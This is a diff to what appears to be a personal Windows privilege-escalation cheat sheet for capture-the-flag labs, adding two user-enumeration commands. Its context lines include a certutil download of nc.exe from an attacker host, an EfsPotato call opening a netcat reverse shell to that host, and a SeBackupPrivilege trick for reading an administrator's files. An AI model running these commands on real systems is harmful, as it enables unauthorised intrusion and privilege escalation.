@@ -1158,6 +1158,7 @@ certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe; cert
 [*] Privilege Escalation
 +---------- Priv Check ----------+
 powershell -c "whoami /user /priv /groups"
+net user 
 
 +---------- SeBackupPrivilege ----------+
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
@@ -1170,6 +1171,7 @@ C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publishe
 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.Publisher -and $_.Publisher -notlike "*Microsoft*" } | Select-Object DisplayName, DisplayVersion, Publisher
 powershell -c "tree \users /a /f"
+powershell -c "net user $USERNAME"
 powershell -c "tree \inetpub /a /f"
 powershell -c "tree \xampp /a /f"
 powershell -c "tree $env:APPDATA/.. /a /f"
